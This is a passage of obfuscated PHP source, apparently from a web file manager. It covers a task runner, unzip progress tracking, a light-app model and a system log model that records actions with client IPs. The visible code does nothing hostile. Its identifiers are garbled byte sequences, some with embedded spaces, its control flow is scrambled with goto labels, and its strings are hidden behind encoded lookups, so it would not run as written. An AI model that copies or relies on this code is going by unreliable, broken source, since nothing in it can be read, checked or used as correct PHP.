Cache::removeMemory(self::QUEUE_DATA); if (!$DâÎ¢é÷Ö) { return array(); } return $DâÎ¢é÷Ö; } public static function setAll($DàÉ“Ö™ñ) { $BÊ§åêô¶ù = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($DàÉ“Ö™ñ), $BÊ§åêô¶ù); Cache::set(self::QUEUE_DATA, $DàÉ“Ö™ñ, $BÊ§åêô¶ù); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($EõÓ∞¡∏öõ, $CÌ…¿ñ≠–Œ = 5.0) { if (!$EõÓ∞¡∏öõ) { return; } $A…„öÆëÎ∑ = Cache::get($EõÓ∞¡∏öõ); if (!$A…„öÆëÎ∑ || timeFloat() - floatVal($A…„öÆëÎ∑) >= $CÌ…¿ñ≠–Œ) { Cache::set($EõÓ∞¡∏öõ, timeFloat(), $CÌ…¿ñ≠–Œ * 10); return !0; } return !1; } public static function timeLimitCall($DÊΩ£ãÁÙ», $E«Õ¬˘«ª, $DÒ–É¨çÈﬁ, $fŸàé∂ãÎØ = 5.0) { goto Eù∫™‡Áé’; b–Æô‘Ì∫ã: $eö°Ó‡ªêê = $EÈó¬Îªï⁄[1603]; $BÈ˜ÇÔüÔ© = Cache::get($eö°Ó‡ªêê, !0); $Aï∂⁄◊ÈÆç = array($EÈó¬Îªï⁄[1604] => timeFloat(), $EÈó¬Îªï⁄[1605] => timeFloat(), $EÈó¬Îªï⁄[262] => $E«Õ¬˘«ª, $EÈó¬Îªï⁄[1598] => $DÒ–É¨çÈﬁ, $EÈó¬Îªï⁄[197] => $fŸàé∂ãÎØ); goto b—ˆè–ƒÀÖ; b—ˆè–ƒÀÖ: if (is_array($BÈ˜ÇÔüÔ©[$DÊΩ£ãÁÙ»])) { $Aï∂⁄◊ÈÆç[$EÈó¬Îªï⁄[1605]] = $BÈ˜ÇÔüÔ©[$DÊΩ£ãÁÙ»][$EÈó¬Îªï⁄[1605]]; } if (is_array($BÈ˜ÇÔüÔ©[$DÊΩ£ãÁÙ»])) { if (timeFloat() - $BÈ˜ÇÔüÔ©[$DÊΩ£ãÁÙ»][$EÈó¬Îªï⁄[1604]] < $Aï∂⁄◊ÈÆç[$EÈó¬Îªï⁄[197]] * 0.3) { return; } $Aï∂⁄◊ÈÆç[$EÈó¬Îªï⁄[1605]] = $BÈ˜ÇÔüÔ©[$DÊΩ£ãÁÙ»][$EÈó¬Îªï⁄[1605]]; } $BÈ˜ÇÔüÔ©[$DÊΩ£ãÁÙ»] = $Aï∂⁄◊ÈÆç; goto fıË≤À≈·®; fıË≤À≈·®: Cache::set($eö°Ó‡ªêê, $BÈ˜ÇÔüÔ©, 60); Cache::removeMemory($eö°Ó‡ªêê); write_log($EÈó¬Îªï⁄[1606] . $DÊΩ£ãÁÙ» . $EÈó¬Îªï⁄[68] . $E«Õ¬˘«ª, $EÈó¬Îªï⁄[1600]); goto Bã∫ëÑØé∑; Eù∫™‡Áé’: $EÈó¬Îªï⁄ =& $_SERVER[ú∫]; if (!$DÊΩ£ãÁÙ» || !$E«Õ¬˘«ª) { return; } self::$asyncAdd = !0; goto b–Æô‘Ì∫ã; Bã∫ëÑØé∑: } public static function timeLimitCallLoop() { goto FÈ°“¥´£Á; bôƒòæ§Èü: if (!$eø–©≈æºÉ && !self::$asyncAdd) { return; } $aŸã êÉñÛ = $e⁄™€ˆπÕ€[1603]; $e∂óÇ·ÍôÎ = Cache::get($aŸã êÉñÛ, !0); goto d†àæíªí∑; dÜëòÿ”‰ë: if (!$b‰ìıäŒ’ç) { return Cache::remove($aŸã êÉñÛ); } Cache::set($aŸã êÉñÛ, $b‰ìıäŒ’ç, 60); Cache::removeMemory($aŸã êÉñÛ); goto Dêà√ëºæﬁ; FÈ°“¥´£Á: $e⁄™€ˆπÕ€ =& $_SERVER[ú∫]; $CêÊ±¿ºâ¿ = array($e⁄™€ˆπÕ€[1607]); $eø–©≈æºÉ = in_array(strtolower(ACTION), $CêÊ±¿ºâ¿); goto bôƒòæ§Èü; D∆âıíá∂†: $b‰ìıäŒ’ç = array(); foreach ($e∂óÇ·ÍôÎ as $D—–å£É…Â => $cÒÕ„úÔ§Ê) { if ($Fﬂ¯ˆÜ±ºç - $cÒÕ„úÔ§Ê[$e⁄™€ˆπÕ€[1605]] > $cÒÕ„úÔ§Ê[$e⁄™€ˆπÕ€[197]]) { $BíÑ«Î∆ªﬁ = !0; try { Hook::apply($cÒÕ„úÔ§Ê[$e⁄™€ˆπÕ€[262]], $cÒÕ„úÔ§Ê[$e⁄™€ˆπÕ€[1598]]); write_log($e⁄™€ˆπÕ€[1608] . $D—–å£É…Â . $e⁄™€ˆπÕ€[68] . $cÒÕ„úÔ§Ê[$e⁄™€ˆπÕ€[262]] . $e⁄™€ˆπÕ€[1609] . ACTION, $e⁄™€ˆπÕ€[1600]); } catch (Exception $EóË◊≠¢¨ﬁ) { } continue; } $b‰ìıäŒ’ç[$D—–å£É…Â] = $cÒÕ„úÔ§Ê; } if (!$BíÑ«Î∆ªﬁ) { return; } goto dÜëòÿ”‰ë; d†àæíªí∑: if (!$e∂óÇ·ÍôÎ || count($e∂óÇ·ÍôÎ) <= 0) { return; } $BíÑ«Î∆ªﬁ = !1; $Fﬂ¯ˆÜ±ºç = timeFloat(); goto D∆âıíá∂†; Dêà√ëºæﬁ: } public static function finished($cùÖ»Í≈–, $cûˆü¥∂è©) { $EÙªª—êØÓ =& $_SERVER[ú∫]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($EÙªª—êØÓ[262] => $cùÖ»Í≈–, $EÙªª—êØÓ[1598] => $cûˆü¥∂è©); } private static function finishedRun() { $bá›ÜèÁï≈ =& $_SERVER[ú∫]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $FûÛÃÒé©´) { try { Hook::apply($FûÛÃÒé©´[$bá›ÜèÁï≈[262]], $FûÛÃÒé©´[$bá›ÜèÁï≈[1598]]); } catch (Exception $d∆”ÛÜ°™ˆ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto CíæÑé·öû; Aä‰Ü£‘Ì¢: Hook::bind($D˘ƒ…ëÂŒ[1089], array($this, $D˘ƒ…ëÂŒ[1612])); $BÀÒÆ–´ûó =& $this->task; $BÀÒÆ–´ûó[$D˘ƒ…ëÂŒ[1613]] = $D˘ƒ…ëÂŒ[1094]; goto c∫Ñ…Õøê¿; c∫Ñ…Õøê¿: if (!$BÀÒÆ–´ûó[$D˘ƒ…ëÂŒ[1432]]) { $BÀÒÆ–´ûó[$D˘ƒ…ëÂŒ[1432]] = LNG($D˘ƒ…ëÂŒ[1614]); } goto FΩ÷èñÒÃ; CíæÑé·öû: $D˘ƒ…ëÂŒ =& $_SERVER[ú∫]; parent::startAfter(); Hook::bind($D˘ƒ…ëÂŒ[1610], array($this, $D˘ƒ…ëÂŒ[1611])); goto Aä‰Ü£‘Ì¢; FΩ÷èñÒÃ: } protected function endAfter() { $CÒøãéå∏… =& $_SERVER[ú∫]; parent::endAfter(); Hook::unbind($CÒøãéå∏…[1610], array($this, $CÒøãéå∏…[1611])); Hook::unbind($CÒøãéå∏…[1089], array($this, $CÒøãéå∏…[1612])); } public function updateAfter() { $fŸ÷∫À¡¬ê =& $_SERVER[ú∫]; $FÀØìßÙ∞ã =& $this->task; if (!$FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1021]] || !$FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[723]]) { return; } if ($FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1613]] == $fŸ÷∫À¡¬ê[1094]) { $A¥àﬂÓ—Ô” = 0; if ($FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1572]]) { $A¥àﬂÓ—Ô” = $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1573]] / $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1572]]; } $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1529]] = $A¥àﬂÓ—Ô” * 0.3; } else { if ($FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1613]] == $fŸ÷∫À¡¬ê[311]) { $A¥àﬂÓ—Ô” = $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1036]] / $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1021]]; $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1529]] = 0.3 + $A¥àﬂÓ—Ô” * 0.4; } else { if ($FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1613]] == $fŸ÷∫À¡¬ê[107]) { $E¨ Ïà±Û√ = 0; if ($FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1574]] == $fŸ÷∫À¡¬ê[107]) { $E¨ Ïà±Û√ = $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1573]]; } $A¥àﬂÓ—Ô” = ($FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1577]] + $E¨ Ïà±Û√) / $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[723]]; $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1529]] = 0.3 + 0.4 + $A¥àﬂÓ—Ô” * 0.3; } } } if ($FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1529]] > 0) { $b∫≈âÖÀ™Ô = timeFloat() - $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[749]] - $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1532]]; $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1533]] = $b∫≈âÖÀ™Ô * (1 - $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1529]]) / $FÀØìßÙ∞ã[$fŸ÷∫À¡¬ê[1529]]; } } public function addFile($F€öı¡·£≈) { goto d´„ñ©¿óÍ; CÂ„ô±ÈÍ˜: $AÒû∫¶æØŒ[$C÷º‰£Òä [1023]] = $C÷º‰£Òä [1589]; $AÒû∫¶æØŒ[$C÷º‰£Òä [1574]] = $C÷º‰£Òä [1094]; $AÒû∫¶æØŒ[$C÷º‰£Òä [723]] = $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [78]]; goto eª–Çªé±Í; f»ÒÊÌŒ√∑: $AÒû∫¶æØŒ[$C÷º‰£Òä [1570]] = $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [28]]; $AÒû∫¶æØŒ[$C÷º‰£Òä [1572]] = $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [78]]; $AÒû∫¶æØŒ[$C÷º‰£Òä [1573]] = 0; goto CÂ„ô±ÈÍ˜; eª–Çªé±Í: $AÒû∫¶æØŒ[$C÷º‰£Òä [1021]] = 1; $Dêè÷ƒÓ¥• = 0; $AÒû∫¶æØŒ[$C÷º‰£Òä [1581]] = array($C÷º‰£Òä [1582] => $Dêè÷ƒÓ¥• + 1, $C÷º‰£Òä [413] => $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [28]], $C÷º‰£Òä [76] => $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [76]], $C÷º‰£Òä [495] => $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [495]] ? $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [495]] : $CÉ∆‰Ù≈”ª[$C÷º‰£Òä [76]]); goto C•Óı·È≠õ; d´„ñ©¿óÍ: $C÷º‰£Òä  =& $_SERVER[ú∫]; $AÒû∫¶æØŒ =& $this->task; $CÉ∆‰Ù≈”ª = IO::info($F€öı¡·£≈); goto f»ÒÊÌŒ√∑; C•Óı·È≠õ: $this->update(); goto Bﬁñîßì≠ß; Bﬁñîßì≠ß: } public function unzipAfter($aûÖ¡‰Áê) { goto dÿÛÈùÓå±; fó§‘çíÇ©: $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1036]] = 0; $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1572]] = 0; $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1573]] = 0; goto c≤€â¯ıŒ›; dÿÛÈùÓå±: $C£éÂì“ô∞ =& $_SERVER[ú∫]; $Eé“Úñ‚¥ç =& $this->task; $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1613]] = $C£éÂì“ô∞[107]; goto BÿπüÇààú; E’ä§Íê†Ü: $this->update(); self::log($C£éÂì“ô∞[1615] . json_encode(array($Eé“Úñ‚¥ç, $Dı≤Ê©«á‚))); goto Dã«°ïî¢ÿ; BÿπüÇààú: $Dı≤Ê©«á‚ = IO::infoWithChildren($aûÖ¡‰Áê); $cΩïØ∫„÷ = 0; $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1581]] = array($C£éÂì“ô∞[1582] => $cΩïØ∫„÷ + 1, $C£éÂì“ô∞[413] => $Dı≤Ê©«á‚[$C£éÂì“ô∞[28]], $C£éÂì“ô∞[76] => $Dı≤Ê©«á‚[$C£éÂì“ô∞[76]], $C£éÂì“ô∞[495] => $Dı≤Ê©«á‚[$C£éÂì“ô∞[495]] ? $Dı≤Ê©«á‚[$C£éÂì“ô∞[495]] : $Dı≤Ê©«á‚[$C£éÂì“ô∞[76]]); goto båî‚¨≤ºá; c≤€â¯ıŒ›: $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1570]] = $C£éÂì“ô∞[33]; $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1577]] = 0; $Eé“Úñ‚¥ç[$C£éÂì“ô∞[723]] = $Dı≤Ê©«á‚[$C£éÂì“ô∞[78]]; goto E’ä§Íê†Ü; båî‚¨≤ºá: if ($Dı≤Ê©«á‚[$C£éÂì“ô∞[29]] == $C£éÂì“ô∞[193]) { $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1021]] = 1; } else { $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1021]] = $Dı≤Ê©«á‚[$C£éÂì“ô∞[81]][$C£éÂì“ô∞[79]]; } $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1023]] = $C£éÂì“ô∞[33]; $Eé“Úñ‚¥ç[$C£éÂì“ô∞[1574]] = 0; goto fó§‘çíÇ©; Dã«°ïî¢ÿ: } public function nameParse($f¯Íï‡ÁØ¯) { goto d˜¢îÎ£Œº; d˜¢îÎ£Œº: $eµÖ®ﬂ¿î‚ =& $_SERVER[ú∫]; $eÂ©Ê≈èó» =& $this->task; if ($eÂ©Ê≈èó»[$eµÖ®ﬂ¿î‚[1613]] == $eµÖ®ﬂ¿î‚[1094]) { $eÂ©Ê≈èó»[$eµÖ®ﬂ¿î‚[1613]] = $eµÖ®ﬂ¿î‚[311]; $eÂ©Ê≈èó»[$eµÖ®ﬂ¿î‚[1577]] = 0; $eÂ©Ê≈èó»[$eµÖ®ﬂ¿î‚[723]] = 0; } goto DüØ…‡ã∑â; DüØ…‡ã∑â: $aè©ƒ›ﬂåâ = get_path_this($f¯Íï‡ÁØ¯); if (strstr($aè©ƒ›ﬂåâ, $eµÖ®ﬂ¿î‚[95])) { $eÂ©Ê≈èó»[$eµÖ®ﬂ¿î‚[1036]] += 1; $eÂ©Ê≈èó»[$eµÖ®ﬂ¿î‚[1021]] += 1; } $eÂ©Ê≈èó»[$eµÖ®ﬂ¿î‚[1570]] = $f¯Íï‡ÁØ¯; goto d⁄ÊíåÌ™÷; d⁄ÊíåÌ™÷: $this->update(); goto CÁö÷˜Ôåë; CÁö÷˜Ôåë: } } goto C”ë±·µ˜à; eèàå¿º¡à: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\114\151\147\150\164\x41\160\160"; public $modelType = "\123\x79\163\164\145\155\x4f\x70\x74\151\157\x6e"; public $field = array("\156\141\155\x65", "\147\162\157\x75\x70", "\x64\145\x73\143", "\x63\157\156\164\x65\156\164"); public function listData($b≈¯—Á‰òØ = false, $DÂ◊äëäíÔ = "\155\x6f\x64\x69\x66\x79\x54\x69\x6d\x65", $F°ä≤Ñ∞í“ = true) { return parent::listData($b≈¯—Á‰òØ, $DÂ◊äëäíÔ, $F°ä≤Ñ∞í“); } public function remove($B¡∏‹¿Ï∞Û) { $B‰€’»≠©Ö = $this->findByName($B¡∏‹¿Ï∞Û); if (!$B‰€’»≠©Ö) { return !1; } return parent::remove($B‰€’»≠©Ö[$_SERVER[ú∫][393]]); } public function add($DÖ≤Ê⁄∑á∑) { if ($this->findByName($DÖ≤Ê⁄∑á∑[$_SERVER[ú∫][28]])) { return !1; } return parent::insert($DÖ≤Ê⁄∑á∑); } public function update($bÀµº·¯⁄Ø, $bÒ˜ñòÛ®ô) { $B©ñ¡≠Ö£ì =& $_SERVER[ú∫]; $f…ÛàÉ«ù’ = $this->findByName($bÀµº·¯⁄Ø); $Dö€öÓÜÉ† = $this->findByName($bÒ˜ñòÛ®ô[$B©ñ¡≠Ö£ì[28]]); if (!$f…ÛàÉ«ù’ || $Dö€öÓÜÉ† && $Dö€öÓÜÉ†[$B©ñ¡≠Ö£ì[393]] != $f…ÛàÉ«ù’[$B©ñ¡≠Ö£ì[393]]) { return !1; } return parent::update($f…ÛàÉ«ù’[$B©ñ¡≠Ö£ì[393]], $bÒ˜ñòÛ®ô); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\x54\151\155\x65", "\164\151\155\145", "\x69\x6e\x73\x65\162\164", "\x66\165\156\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $cùŒ∂ª•Ñ‹ =& $_SERVER[ú∫]; return array($cùŒ∂ª•Ñ‹[2004] => LNG($cùŒ∂ª•Ñ‹[2005]), $cùŒ∂ª•Ñ‹[2006] => LNG($cùŒ∂ª•Ñ‹[2007]), $cùŒ∂ª•Ñ‹[1632] => LNG($cùŒ∂ª•Ñ‹[2008]), $cùŒ∂ª•Ñ‹[2009] => LNG($cùŒ∂ª•Ñ‹[2010]), $cùŒ∂ª•Ñ‹[2011] => LNG($cùŒ∂ª•Ñ‹[2012]), $cùŒ∂ª•Ñ‹[2013] => LNG($cùŒ∂ª•Ñ‹[2014]), $cùŒ∂ª•Ñ‹[2015] => LNG($cùŒ∂ª•Ñ‹[2016]), $cùŒ∂ª•Ñ‹[1662] => LNG($cùŒ∂ª•Ñ‹[2016]), $cùŒ∂ª•Ñ‹[1663] => LNG($cùŒ∂ª•Ñ‹[2017]), $cùŒ∂ª•Ñ‹[2018] => LNG($cùŒ∂ª•Ñ‹[2019]), $cùŒ∂ª•Ñ‹[2020] => LNG($cùŒ∂ª•Ñ‹[2021]), $cùŒ∂ª•Ñ‹[2022] => LNG($cùŒ∂ª•Ñ‹[2023]), $cùŒ∂ª•Ñ‹[2024] => LNG($cùŒ∂ª•Ñ‹[2025]), $cùŒ∂ª•Ñ‹[1660] => LNG($cùŒ∂ª•Ñ‹[2026]), $cùŒ∂ª•Ñ‹[2027] => LNG($cùŒ∂ª•Ñ‹[2028]), $cùŒ∂ª•Ñ‹[1667] => LNG($cùŒ∂ª•Ñ‹[2029]), $cùŒ∂ª•Ñ‹[2030] => LNG($cùŒ∂ª•Ñ‹[2031]), $cùŒ∂ª•Ñ‹[2032] => LNG($cùŒ∂ª•Ñ‹[2033]), $cùŒ∂ª•Ñ‹[2034] => LNG($cùŒ∂ª•Ñ‹[2035]), $cùŒ∂ª•Ñ‹[2036] => LNG($cùŒ∂ª•Ñ‹[2037]), $cùŒ∂ª•Ñ‹[1670] => LNG($cùŒ∂ª•Ñ‹[2038]), $cùŒ∂ª•Ñ‹[1671] => LNG($cùŒ∂ª•Ñ‹[2039]), $cùŒ∂ª•Ñ‹[2040] => LNG($cùŒ∂ª•Ñ‹[2041]), $cùŒ∂ª•Ñ‹[2042] => LNG($cùŒ∂ª•Ñ‹[2043]), $cùŒ∂ª•Ñ‹[2044] => LNG($cùŒ∂ª•Ñ‹[2045]), $cùŒ∂ª•Ñ‹[1665] => LNG($cùŒ∂ª•Ñ‹[2046]), $cùŒ∂ª•Ñ‹[2047] => LNG($cùŒ∂ª•Ñ‹[2048]), $cùŒ∂ª•Ñ‹[1664] => LNG($cùŒ∂ª•Ñ‹[2049]), $cùŒ∂ª•Ñ‹[2050] => LNG($cùŒ∂ª•Ñ‹[2051]), $cùŒ∂ª•Ñ‹[2052] => LNG($cùŒ∂ª•Ñ‹[2053]), $cùŒ∂ª•Ñ‹[2054] => LNG($cùŒ∂ª•Ñ‹[2055]), $cùŒ∂ª•Ñ‹[2056] => LNG($cùŒ∂ª•Ñ‹[2056]), $cùŒ∂ª•Ñ‹[2057] => LNG($cùŒ∂ª•Ñ‹[1636]), $cùŒ∂ª•Ñ‹[2058] => LNG($cùŒ∂ª•Ñ‹[2059]), $cùŒ∂ª•Ñ‹[2060] => LNG($cùŒ∂ª•Ñ‹[2061]), $cùŒ∂ª•Ñ‹[2062] => LNG($cùŒ∂ª•Ñ‹[2063]), $cùŒ∂ª•Ñ‹[2064] => LNG($cùŒ∂ª•Ñ‹[2065]), $cùŒ∂ª•Ñ‹[2066] => LNG($cùŒ∂ª•Ñ‹[2067]), $cùŒ∂ª•Ñ‹[2068] => LNG($cùŒ∂ª•Ñ‹[2068]), $cùŒ∂ª•Ñ‹[2069] => LNG($cùŒ∂ª•Ñ‹[2070]), $cùŒ∂ª•Ñ‹[2071] => LNG($cùŒ∂ª•Ñ‹[2072]), $cùŒ∂ª•Ñ‹[2073] => LNG($cùŒ∂ª•Ñ‹[2074]), $cùŒ∂ª•Ñ‹[2075] => LNG($cùŒ∂ª•Ñ‹[2076]), $cùŒ∂ª•Ñ‹[2077] => LNG($cùŒ∂ª•Ñ‹[2078]), $cùŒ∂ª•Ñ‹[2079] => LNG($cùŒ∂ª•Ñ‹[2080])); } private function typeFile() { $BµÃÍ¢®ú =& $_SERVER[ú∫]; $CπÏ÷ÜÈ∑ô = array($BµÃÍ¢®ú[1667] => array($BµÃÍ¢®ú[1668]), $BµÃÍ¢®ú[2022] => array($BµÃÍ¢®ú[2081]), $BµÃÍ¢®ú[2024] => array($BµÃÍ¢®ú[2082]), $BµÃÍ¢®ú[1660] => array($BµÃÍ¢®ú[1661]), $BµÃÍ¢®ú[2032] => array(), $BµÃÍ¢®ú[2034] => array(), $BµÃÍ¢®ú[2036] => array(), $BµÃÍ¢®ú[1670] => array($BµÃÍ¢®ú[1672]), $BµÃÍ¢®ú[1671] => array($BµÃÍ¢®ú[1672]), $BµÃÍ¢®ú[2040] => array($BµÃÍ¢®ú[2083]), $BµÃÍ¢®ú[2042] => array($BµÃÍ¢®ú[2083]), $BµÃÍ¢®ú[2044] => array($BµÃÍ¢®ú[2084]), $BµÃÍ¢®ú[2030] => array($BµÃÍ¢®ú[2085]), $BµÃÍ¢®ú[1665] => array($BµÃÍ¢®ú[2086]), $BµÃÍ¢®ú[2047] => array($BµÃÍ¢®ú[2087]), $BµÃÍ¢®ú[1664] => array($BµÃÍ¢®ú[1666])); return $CπÏ÷ÜÈ∑ô; } private function typeAll() { goto aæ⁄ıÑç√ã; döÜÊ¯Ò∫Ó: return $B‹°ªÎ†¥—; goto EÜÍÎ∏îÃ»; aæ⁄ıÑç√ã: $B¬ˆ™£é¨‚ =& $_SERVER[ú∫]; $B‹°ªÎ†¥— = $this->typeList; $a Î”—≤·ì = array_filter($this->typeFile()); goto AÇ§Œîã°ø; AÇ§Œîã°ø: foreach ($a Î”—≤·ì as $e„çƒÇâ–Ÿ => $d¿ﬂ€‘Œÿ∏) { $B‹°ªÎ†¥—[$d¿ﬂ€‘Œÿ∏[0]] = $B‹°ªÎ†¥—[$e„çƒÇâ–Ÿ]; } $B‹°ªÎ†¥—[$B¬ˆ™£é¨‚[1672]] = LNG($B¬ˆ™£é¨‚[2088]); $B‹°ªÎ†¥—[$B¬ˆ™£é¨‚[2083]] = LNG($B¬ˆ™£é¨‚[2089]); goto döÜÊ¯Ò∫Ó; EÜÍÎ∏îÃ»: } public function addLog($A£¶≠Ñäõ∆, $fÆÚ¢Ç° ñ = array()) { goto CìûáÎà⁄¬; CìûáÎà⁄¬: $AŒ«≥ ñ€Ü =& $_SERVER[ú∫]; if (!isset($this->typeList[$A£¶≠Ñäõ∆])) { return; } $EêëüÑòúÛ = defined($AŒ«≥ ñ€Ü[454]) && USER_ID ? USER_ID : (isset($fÆÚ¢Ç° ñ[$AŒ«≥ ñ€Ü[1528]]) ? $fÆÚ¢Ç° ñ[$AŒ«≥ ñ€Ü[1528]] : 0); goto C©ºüÛâÈÉ; CÙÒ©ôü‘ì: $fÆÚ¢Ç° ñ = array($AŒ«≥ ñ€Ü[1519] => Session::sign(), $AŒ«≥ ñ€Ü[1520] => $EêëüÑòúÛ, $AŒ«≥ ñ€Ü[29] => $A£¶≠Ñäõ∆, $AŒ«≥ ñ€Ü[1522] => json_encode($fÆÚ¢Ç° ñ)); parent::add($fÆÚ¢Ç° ñ); goto A€˘⁄•¯ÃÖ; C©ºüÛâÈÉ: if (!$EêëüÑòúÛ) { $EêëüÑòúÛ = (int) Session::get($AŒ«≥ ñ€Ü[1818]); } $DÿÛÏÔöîÇ = get_client_ip(); if (!$fÆÚ¢Ç° ñ || strlen(json_encode($fÆÚ¢Ç° ñ)) >= 1024) { $fÆÚ¢Ç° ñ = array($AŒ«≥ ñ€Ü[2090] => $DÿÛÏÔöîÇ); } else { if (is_array($fÆÚ¢Ç° ñ)) { $fÆÚ¢Ç° ñ[$AŒ«≥ ñ€Ü[2090]] = $DÿÛÏÔöîÇ; } else { $fÆÚ¢Ç° ñ = array($AŒ«≥ ñ€Ü[1088] => $fÆÚ¢Ç° ñ, $AŒ«≥ ñ€Ü[2090] => $DÿÛÏÔöîÇ); } } goto CÙÒ©ôü‘ì; A€˘⁄•¯ÃÖ: } public function remove($A∂é‚ÑûÙ£) { $this->where(array($_SERVER[ú∫][412] => $A∂é‚ÑûÙ£))->delete(); } private function _makeOrder($Aæﬂ⁄˘œÉí = '') { goto båøÎÎ›Øæ; e•à™„æéπ: $d‰ºá†©Ì = Input::get($dºûÊÇ˜›ê[436], $dºûÊÇ˜›ê[7], $dºûÊÇ˜›ê[1850], array($dºûÊÇ˜›ê[1774], $dºûÊÇ˜›ê[430])); $d‰ºá†©Ì = $dÁ¢¶µîﬂÙ[$d‰ºá†©Ì]; $Aæﬂ⁄˘œÉí = $Aæﬂ⁄˘œÉí . "{$D“ÍëÓ™óÍ}\40{$d‰ºá†©Ì}"; goto cΩ”Ì˘–ÃÃ; båøÎÎ›Øæ: $dºûÊÇ˜›ê =& $_SERVER[ú∫]; $D“ÍëÓ™óÍ = $dºûÊÇ˜›ê[194]; $dÁ¢¶µîﬂÙ = array($dºûÊÇ˜›ê[428] => $dºûÊÇ˜›ê[429], $dºûÊÇ˜›ê[430] => $dºûÊÇ˜›ê[431]); goto e•à™„æéπ; cΩ”Ì˘–ÃÃ: return $this->order($Aæﬂ⁄˘œÉí); goto a£™ÙÕ´ª›; a£™ÙÕ´ª›: } public function get($CÌÍä©œ€∂ = '') { goto EÉ∑ÉüÍå÷; e›⁄ˆâ¥ã: if (!empty($CÌÍä©œ€∂[$Eèòó∏Ñœ¶[2090]])) { $Búæû¨Ω√ê[$Eèòó∏Ñœ¶[431]] = array($Eèòó∏Ñœ¶[380], "\x25{$CÌÍä©œ€∂[$Eèòó∏Ñœ¶[2090]]}\x25"); } $bß∆ê—éÀõ = $this->_makeOrder()->where($Búæû¨Ω√ê)->selectPage(); if (empty($bß∆ê—éÀõ[$Eèòó∏Ñœ¶[367]])) { show_json(array(), !0, $bß∆ê—éÀõ[$Eèòó∏Ñœ¶[364]]); } goto c°´ÜÂ∞≥¿; EÉ∑ÉüÍå÷: $Eèòó∏Ñœ¶ =& $_SERVER[ú∫]; if (!$CÌÍä©œ€∂) { show_json(array()); } $Búæû¨Ω√ê = array(); goto bÙΩ–ÂÖ∏É; c°´ÜÂ∞≥¿: $bß∆ê—éÀõ[$Eèòó∏Ñœ¶[367]] = $this->logList($bß∆ê—éÀõ[$Eèòó∏Ñœ¶[367]]); return $bß∆ê—éÀõ; goto C¬øÿÑ«∂§; bÙΩ–ÂÖ∏É: if ($CÌÍä©œ€∂[$Eèòó∏Ñœ¶[1528]]) { $Búæû¨Ω√ê[$Eèòó∏Ñœ¶[1528]] = $CÌÍä©œ€∂[$Eèòó∏Ñœ¶[1528]]; } if (isset($CÌÍä©œ€∂[$Eèòó∏Ñœ¶[721]])) { $Cå‘’Öπá÷ = $CÌÍä©œ€∂[$Eèòó∏Ñœ¶[721]]; $eâêƒÑõ€¥ = isset($CÌÍä©œ€∂[$Eèòó∏Ñœ¶[476]]) ? $CÌÍä©œ€∂[$Eèòó∏Ñœ¶[476]] : time(); $Búæû¨Ω√ê[$Eèòó∏Ñœ¶[194]] = array($Eèòó∏Ñœ¶[331], array($Cå‘’Öπá÷, $eâêƒÑõ€¥)); } if ($CÌÍä©œ€∂[$Eèòó∏Ñœ¶[29]]) { $AÑø≥£åß… = explode($Eèòó∏Ñœ¶[47], $CÌÍä©œ€∂[$Eèòó∏Ñœ¶[29]]); $FâùÈ°•›  = $this->typeFile(); $cÆéñÌ€ÿ¬ = array(); foreach ($AÑø≥£åß… as $CñÃÊÇéÔ≥) { $cÆéñÌ€ÿ¬[] = $CñÃÊÇéÔ≥; if (isset($FâùÈ°•› [$CñÃÊÇéÔ≥])) { $cÆéñÌ€ÿ¬ = array_merge($cÆéñÌ€ÿ¬, $FâùÈ°•› [$CñÃÊÇéÔ≥]); } } $cÆéñÌ€ÿ¬ = 